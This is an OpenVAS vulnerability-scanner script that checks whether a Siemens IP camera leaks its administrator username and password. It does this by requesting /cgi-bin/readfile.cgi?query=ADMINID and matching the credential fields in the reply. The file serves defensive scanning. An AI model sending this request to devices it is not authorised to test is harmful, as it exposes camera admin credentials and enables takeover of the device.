###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_siemens_ip_camera_credentials_disclosure_vuln.nasl 12338 2018-11-13 14:51:17Z asteins $
#
# SIEMENS IP-Camera Credentials Disclosure Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807879");
  script_version("$Revision: 12338 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-11-13 15:51:17 +0100 (Tue, 13 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-08-18 11:01:49 +0530 (Thu, 18 Aug 2016)");
  script_name("SIEMENS IP-Camera Credentials Disclosure Vulnerability");

  script_tag(name:"summary", value:"The host is running SIEMENS IP-Camera
  and is prone to credentials disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to read the credentials or not.");

  script_tag(name:"insight", value:"The flaw exists due to an improper
  restriction on user access levels for certain pages.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read username and password of the device.");

  script_tag(name:"affected", value:"CCMW3025:  All  versions  <  1.41_SP18_S1,

     CVMW3025-IR:  All  versions  <  1.41_SP18_S1,

     CFMW3025:  All  versions  <  1.41_SP18_S1,

     CCPW3025:  All  versions  <  0.1.73_S1,

     CCPW5025:  All  versions  <  0.1.73_S1,

     CCMD3025-DN18:  All  versions  <  v1.394_S1,

     CCID1445-DN18:  All  versions  <  v2635,

     CCID1445-DN28:  All  versions  <  v2635,

     CCID1445-DN36:  All  versions  <  v2635,

     CFIS1425:  All  versions  <  v2635,

     CCIS1425:  All  versions  <  v2635,

     CFMS2025:  All  versions  <  v2635,

     CCMS2025:  All  versions  <  v2635,

     CVMS2025-IR:  All  versions  <  v2635,

     CFMW1025:  All  versions  <  v2635,

     CCMW1025:  All  versions  <  v2635.");

  script_tag(name:"solution", value:"Updates were issued to solve this vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40254");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Boa/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.siemens.com/cert/pool/cert/siemens_security_advisory_ssa-284765.pdf");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

sie_port = get_http_port(default:80);

## Siemens IP Camera uses 'Boa by topco' integrated web server
## Application confirmation to more specific is not possible, hence not
## going for detect NVT.
banner = get_http_banner(port:sie_port);
if('Server: Boa by topco' >!< banner){
  exit(0);
}

url = "/cgi-bin/readfile.cgi?query=ADMINID";

if(http_vuln_check(port:sie_port, url:url,  pattern:'var Adm_ID="', check_header:TRUE,
                   extra_check:make_list('var Adm_Pass1="', 'var Adm_Pass2="', 'var Language="')))
{
  report = report_vuln_url(port:sie_port, url:url);
  security_message(port:sie_port, data:report);
  exit(0);
}

exit(99);